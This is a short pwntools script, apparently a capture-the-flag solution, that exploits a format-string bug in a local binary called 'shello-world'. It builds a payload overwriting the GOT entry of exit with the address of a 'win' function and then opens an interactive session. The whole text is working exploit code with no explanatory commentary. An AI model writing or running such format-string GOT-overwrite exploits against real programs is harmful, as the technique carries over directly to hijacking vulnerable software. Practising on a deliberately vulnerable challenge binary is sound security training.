from pwn import * 

exe = context.binary = ELF('shello-world')

winaddr = exe.symbols['win']
print(winaddr)
exitaddr = exe.got['exit']

# offset = 6


def findOffset(payload):
    io = exe.process()
    io.sendline(payload)
    response = io.recvline()

    return response

fmt = FmtStr(findOffset, offset = 6)


io = exe.process()
pay = fmtstr_payload(6, {exitaddr: winaddr})
io.sendline(pay)
io.interactive()